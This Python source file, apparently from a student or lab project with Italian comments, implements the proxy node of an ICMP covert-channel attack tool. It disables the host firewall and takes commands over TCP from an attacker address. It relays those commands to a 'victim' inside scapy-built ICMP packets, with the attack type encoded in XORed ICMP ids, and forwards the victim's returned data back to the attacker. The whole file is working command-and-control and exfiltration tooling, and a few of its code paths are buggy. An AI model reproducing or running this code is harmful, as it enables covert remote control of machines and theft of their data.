#from scapy.all import * 
from scapy.all import IP, ICMP, Raw 

import ipaddress
import sys 
import os 
import argparse  
import threading 
import json 
import socket 

from mymethods import IS_TYPE as istype, IP_INTERFACE as ipinterface, THREADING_EVENT as threadevent, CALC as mycalc 
from mymethods import TIMER as mytimer, GET as get, SNIFFER as mysniffer, THREAD as mythread, PARSER as myparser
from mymethods import ping_once, is_scelta_SI_NO, print_dictionary, disable_firewall, reenable_firewall, ask_bool_choice 
from mymethods import CONFIRM_ATTACKER, CONFIRM_VICTIM, CONFIRM_PROXY, CONFIRM_COMMAND, ATTACK_FUNCTION 
from mymethods import LAST_PACKET, WAIT_DATA, END_COMMUNICATION, END_DATA, exit_cases

from scapy.all import IP, ICMP, Raw, Ether, IPv6, IPerror6, ICMPerror, IPerror
from scapy.all import ICMPv6EchoReply, ICMPv6EchoRequest, ICMPv6ParamProblem, ICMPv6TimeExceeded, ICMPv6PacketTooBig, ICMPv6DestUnreach
from scapy.all import get_if_hwaddr, sendp, sr1, sniff, send 

file_path = "./attacksingleton.py"
directory = os.path.dirname(file_path)
sys.path.insert(0, directory)
import attacksingleton 

#--------------------------------
def update_victim_end_communication(ip_vittima:ipaddress.IPv4Address):
    if not istype.ipaddress(ip_vittima):
        raise Exception(f"Argomenti non validi {type(ip_vittima)}") 
    data=END_COMMUNICATION
    mysniffer.send_packet(data.encode(),ip_dst=ip_vittima)
    print(f"{ip_vittima}: la vittima stata aggiornata")

def wait_data_from_vicitm(ip_src:ipaddress.IPv4Address, ip_dst:ipaddress.IPv4Address, attack_function:dict, data_received:list): 
    if not (istype.ipaddress(ip_src) and istype.ipaddress(ip_dst) and istype.dictionary(attack_function) and istype.list(data_received)):
        raise Exception(f"wait_data_from_vicitm: Argomenti non validi")
    try: 
        print(f"Tramite l'attacco {attack_function[0][1]} aspetto che {ip_src} mandi i dati")   
        attacksingleton.wait_data(
            attack_function
            ,ip_dst
            ,data_received
            ,ip_src 
        )  
    except Exception as e:
        raise Exception(f"wait_data_from_vicitm: {e}") 

def confirm_att_about_victim(ip_vittima:ipaddress.IPv4Address, ip_host:ipaddress.IPv4Address, socket_attacker:socket.socket, result:bool):
    try: 
        data=CONFIRM_VICTIM+ip_vittima.compressed+ip_host.compressed+str(result)
        socket_attacker.sendall(data.encode()) 
        print(f"Aggiornamento confermato all'attaccante")
        if not result:
            socket_attacker.close()
            raise Exception(f"\t***{ip_host} non è connesso a {ip_vittima}") 
        print(f"\t***{ip_host} è connesso a {ip_vittima}")  
    except Exception as e: 
        print(f"confirm_att_about_victim: {e}")
        exit(1)  

#--------------------------------
def callback_wait_conn_from_victim(ip_vittima:ipaddress.IPv4Address, ip_host:ipaddress.IPv4Address, event_pktconn:threading.Event): 
    print("Monitoraggio del traffico per la conferma di connessione dalla vittima")
    def callback(packet): 
        nonlocal ip_vittima, ip_host, event_pktconn
        print(f"callback wait_conn_from_victim received:\n\t{packet.summary()}") 
        if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw):   
            #print(f"Ricevuto pacchetto da {packet[IP].src}...")
            confirm_text=(CONFIRM_VICTIM+ip_vittima.compressed+ip_host.compressed)
            check_sum=mycalc.checksum(confirm_text.encode()) 
            if confirm_text in packet[Raw].load.decode() and ip_vittima.compressed==packet[IP].src: 
                print(f"La vititma ha confermato la connessione...") 
                threadevent.set(event_pktconn) 
                return
        print(f"La vittima non ha confermato la connessione...")
    return callback  

def wait_conn_from_victim(ip_vittima:ipaddress.IPv4Address, ip_host:ipaddress.IPv4Address, thread_lock:threading.Lock, thread_response:dict[str, bool]):
    try:
        confirm_text=CONFIRM_VICTIM+ip_vittima.compressed+ip_host.compressed
        checksum=mycalc.checksum(confirm_text.encode())
        interface=ipinterface.iface_from_IP(ip_vittima)
        event_pktconn=get.threading_Event()
        #filter=attacksingleton.get_filter_connection_from_function(
        #    "wait_conn_from_victim"
        #    ,ip_vittima
        #    ,checksum
        #) 
        IPv4_ECHO_REQUEST_TYPE=8
        IPv4_ECHO_REPLY_TYPE=0
        filter=f"icmp and (icmp[0]=={IPv4_ECHO_REQUEST_TYPE} or icmp[0]=={IPv4_ECHO_REPLY_TYPE}) and src {ip_vittima.compressed} and dst {ip_host.compressed} and icmp[4:2]={checksum}"
    except Exception as e:
        raise Exception(f"wait_conn_from_victim variabili: {e}") 
    try:
        args={
            "filter":filter
            #,"count":1 
            ,"prn":callback_wait_conn_from_victim(
                ip_vittima
                ,ip_host
                ,event_pktconn
            )
            #,"store":True 
            ,"iface":interface
        } 
        callback_func_timer=lambda: mysniffer.template_timeout(event_pktconn) 
        sniffer,pkt_timer=mysniffer.sniff_packet(args=args,callback_func_timer=callback_func_timer) 
    except Exception as e:
        raise Exception(f"wait_conn_from_victim sniffer: {e}")  
    threadevent.wait(event_pktconn) 
    if res:= mysniffer.stop(sniffer) and mytimer.stop(pkt_timer): 
        print(f"La connessione per {ip_vittima} è confermata")  
    else: 
        print(f"La connessione per {ip_vittima} non è confermata") 
    mythread.update_thread_response(
        ip_host
        ,thread_lock
        ,thread_response
        ,res
    )
    return res

#--------------------------------
def setup_thread(callback_function=None,ip_host:ipaddress.IPv4Address|ipaddress.IPv6Address=None):  
    if not istype.ipaddress(ip_host):
        raise Exception("setup_thread:ip_host non è ne un IPv4Address ne un IPv6Address") 
    if not istype.callable_function(callback_function): 
        raise ValueError("setup_thread:La callback function passata non è chiamabile")  
    thread_lock=threading.Lock() 
    thread_response={ip_host.exploded:False} 
    thread_dict={ip_host.exploded:threading.Thread( target=callback_function)}   
    return thread_lock, thread_response, thread_dict

def setup_server(ip_attaccante:ipaddress.IPv4Address|ipaddress.IPv6Address):
    if not isinstance(ip_attaccante, ipaddress.IPv4Address) and not isinstance(ip_attaccante, ipaddress.IPv6Address):
        raise Exception(f"IP attaccante non è istanza di IPv4Address ne di IPv6Address")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        print(f"Server listening: {s}")  
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
        s.bind(("192.168.56.104", 4567))  #(socket.gethostname(), 4567)
        s.listen(1)
        socket_attacker, attacker_addr=s.accept()
        if ipaddress.ip_address(attacker_addr[0]).compressed != ip_attaccante.compressed:
            socket_attacker.close()
        else:
            #with self.socket_attacker:   
            data_received=socket_attacker.recv(1024).decode()
            if not data_received or CONFIRM_ATTACKER not in data_received:
                print(f"Invalid data from {attacker_addr}: {data_received}") 
                socket_attacker.close()  
                exit(0) 
    return data_received, socket_attacker

def update_data_received(data, data_lock:threading.Lock, data_received):
    data_lock.acquire()
    data_received.append(data)
    data_lock.release() 

#--------------------------------
def get_args_from_parser(): 
    parser = argparse.ArgumentParser() 
    parser.add_argument("--ip_attaccante",type=str, help="IP dell'attaccante") 
    #parser.add_argument("--provaFlag",type=str, help="Comando da eseguire")
    try:
        args, unknown =myparser.check_arguments(parser)  
        if len(unknown) > 0: 
            raise Exception(f"get_args_from_parser:Argomenti sconosciuti {unknown}") 
        if not isinstance(args,argparse.Namespace): 
            raise Exception(f"get_args_from_parser:Argomento parser non è istanza di argparse.Namespace")  
        if not isinstance(args.ip_attaccante,str): 
            raise Exception(f"get_args_from_parser: --ip_attaccante non specificato {args.ip_attaccante}") 
        return args
    except Exception as e:
        print(f"Eccezione: {e}")
        myparser.print_supported_arguments(parser)
    return None

#--------------------------------
class Proxy:  
    DEBUG=True
    def __init__(self): 
        try:
            if not isinstance(args:=get_args_from_parser(),argparse.Namespace): 
                raise ValueError("args non istanza di argparse.Namespace") 
            self.ip_attaccante=ipaddress.ip_address(args.ip_attaccante)
            print(f"IP attaccante: {self.ip_attaccante}")  
            ip_host,err=ipinterface.find_local_IP() 
            if err:
                raise Exception(f"inti: ip host non ricavato {err}")
            print(f"Ip host ricavato {ip_host}")
            self.ip_host=ipaddress.ip_address(ip_host)
            self.ip_vittima=None 
            self.attack_function={}  
        except Exception as e: 
            print(f"Eccezione: {e}") 
            exit(1) 
        try:
            disable_firewall()
            if self.DEBUG:
                self.debug_connection_with_attacker()
            else:
                self.connection_with_attacker() 
            if not self.connection_with_victim(): 
                raise Exception("Macchina non connessa alla vittima") 
            if self.DEBUG:
                self.debug_wait_command_from_attacker()
            else: 
                self.wait_command_from_attacker()
        except Exception as e:
            print(f"_init_ {e}")
        reenable_firewall() 
    
    def connection_with_attacker(self):
        #socket.create_server(addr, family=socket.AF_INET6, dualstack_ipv6=True) #socket 4 both ipv4 and ipv6
        data_received, self.socket_attacker= setup_server(self.ip_attaccante) 
        data_received=data_received.split("||")
        print("Dati ricevuti: ", data_received)
        for data in data_received:
            if CONFIRM_ATTACKER in data:
                self.ip_vittima=ipaddress.ip_address(data.replace(CONFIRM_ATTACKER,""))
                print(f"IP vittima: {type(self.ip_vittima)} : {self.ip_vittima}")
            elif ATTACK_FUNCTION in data:
                self.attack_function.update(attacksingleton.AttackType().get_attack_function(data.replace(ATTACK_FUNCTION,"")))
                print(f"Func attacco: {type(self.attack_function)} : {self.attack_function}") 
        data=CONFIRM_PROXY+self.ip_vittima.compressed+self.ip_host.compressed
        self.socket_attacker.sendall(data.encode()) 
        print("Socket con attaccante stabilito") 
    
    def debug_connection_with_attacker(self):
        default_file_path:str = "./attack_file.json" 
        path_of_file=""
        config_file=None
        if not os.path.exists(path_of_file) or not str(path_of_file).endswith(".json"):
            if os.path.exists(default_file_path):
                print(f"File di configurazione {file_path}  non trovato, si usa quello di default")
                path_of_file=default_file_path
            else: 
                raise FileNotFoundError(f"I file {path_of_file} e {default_file_path} non esistono")
        with open(path_of_file, 'r') as file: 
            print(f"File di configurazione {path_of_file} caricato correttamente") 
            config_file= json.load(file) 
        self.attack_function = attacksingleton.AttackType().get_attack_function(config_file.get("attack_function"))
        if not istype.dictionary(self.attack_function) or len(self.attack_function.items())!=1:
            self.attack_function=attacksingleton.choose_attack_function() 
        print(f"Attacco selezionato: {self.attack_function}") 
        self.ip_vittima = ipaddress.ip_address(config_file.get("ip_vittima", None))  
        if not istype.ipaddress(self.ip_vittima):
            raise ValueError(f"L'indirizzo IP della vittima non è valido: {self.ip_vittima}") 
        print(f"IP vittima valido: {type(self.ip_vittima) } {self.ip_vittima }") 
    
    def connection_with_victim(self):
        try: 
            self.thread_lock, self.thread_response, self.thread_dict=setup_thread(
                callback_function=lambda: wait_conn_from_victim(self.ip_vittima, self.ip_host, self.thread_lock, self.thread_response) 
                ,ip_host=self.ip_host
            )
            print(f"Lock creato:\t{self.thread_lock}") 
            print(f"Risposte per i thread create:\t{self.thread_response}") 
            print(f"Dizionario dei thread creato:\t{self.thread_dict}")
            thread=self.thread_dict.get(self.ip_host.exploded)
            thread.start()  
            
            int_version, int_code= next(iter(self.attack_function.items()))[0].replace("ipv","").split("_")
            XORversion= ord("i") ^ int(int_version)
            XORcode= ord("p") ^ int(int_code)
            icmp_id=(XORversion<<8)+XORcode 
            confirm_text=CONFIRM_PROXY+self.ip_vittima.compressed
            mysniffer.send_packet(confirm_text.encode() , self.ip_vittima, icmp_id=icmp_id)
            print("Aspetto che il thread termini")
            thread.join() 
            print("AAAA")
            self.thread_lock.acquire()
            result=self.thread_response.get(self.ip_host.exploded) and result
            self.thread_lock.release() 
            if not self.DEBUG:
                print("Attacccante aggiornato sullo stato della connessione con la vittima")
                confirm_att_about_victim(
                    self.ip_vittima, self.ip_host, self.socket_attacker, result
                ) 
        except Exception as e: 
            print(f"connection_with_victim: {e}")
            exit(1) 
        
    def wait_command_from_attacker(self): 
        self.data_lock=threading.Lock()
        print("Waiting for the attacker's command")
        data_socket=self.socket_attacker.recv(1024).decode()  
        while data_socket and data_socket not in exit_cases and END_COMMUNICATION not in data_socket: 
            self.data_received=[]  
            thread_data=threading.Thread(
                target= lambda: wait_data_from_vicitm(self.ip_vittima, self.ip_host, self.attack_function, self.data_received)
            )
            thread_data.start()
            #if comando is not None:
            #   data=CONFIRM_COMMAND+comando
            if CONFIRM_COMMAND in data_socket:   
                command= data_socket.replace(CONFIRM_COMMAND,"").strip()
                print(f"Il comando per la vittima è: {command}")
                attacksingleton.send_data(self.attack_function, command.encode(), self.ip_vittima)
            elif WAIT_DATA in command:
                print("Non ho il comando per la vittima. Dalla vittima aspetto i dati")
            else: 
                print(f"COMMAND: caso non contemplato {command}")
            if thread_data.ident is not None:
                thread_data.join()
            print(f"wait_command_from_attacker: End thread Data received: {self.data_received}")
            if len(self.data_received)<=0:
                print("Non si mandano i dati all'attaccante")
                self.socket_attacker.sendall(LAST_PACKET.encode()) 
            else:
                self.redirect_data_to_attacker()
            data_socket=self.socket_attacker.recv(1024).decode()
        print("Interruzione del programma")
        update_victim_end_communication(self.ip_vittima)
        self.socket_attacker.close() 
    
    def debug_wait_command_from_attacker(self): 
        msg=f"Inserisci un comando da eseguire (o 'exit' per uscire):\n\t>>> "
        command=input(msg) 
        while command.lower() not in exit_cases:  
            self.data_received=[]  
            thread_data=threading.Thread(
                target= lambda: wait_data_from_vicitm(self.ip_vittima, self.ip_host, self.attack_function, self.data_received)
            )
            thread_data.start()
            print(f"Il comando per la vittima è: {command}")
            attacksingleton.send_data(self.attack_function, command.encode(), self.ip_vittima)
            if thread_data.ident is not None: 
                print("Si apsetta che il thread termini")
                thread_data.join()
            print(f"Dati ricevuti {self.data_received}") 
            if len(self.data_received)<=0 or self.DEBUG:
                print("Nessun dato valido. Non si mandano i dati all'attaccante") 
            command=input(msg) 
        print("Interruzione del programma")

    def redirect_data_to_attacker(self):
        if not istype.list(self.data_received):
            raise Exception(f"Argomenti non validi: {type(self.data_received)}") 
        print(f"data_received: {self.data_received}") 
        for data in self.data_received:
            print("Data: ",data)
            #id, seq, info= data
            #print(f"Data {id} / {seq} / {info}")
            #info= info.decode() if isinstance(info,bytes) else info  
            try: 
                self.socket_attacker.sendall(data.encode())
                #self.socket_attacker.sendall(
                #    (f"{id}\t{seq}\t{info}||").encode()
                #)
            except Exception as e:
                print(f"redirect_data_to_attacker: {e}")
        self.socket_attacker.sendall(LAST_PACKET.encode())
        print(f"Dati mandati all'attaccante") 

if __name__=="__main__":  
    Proxy()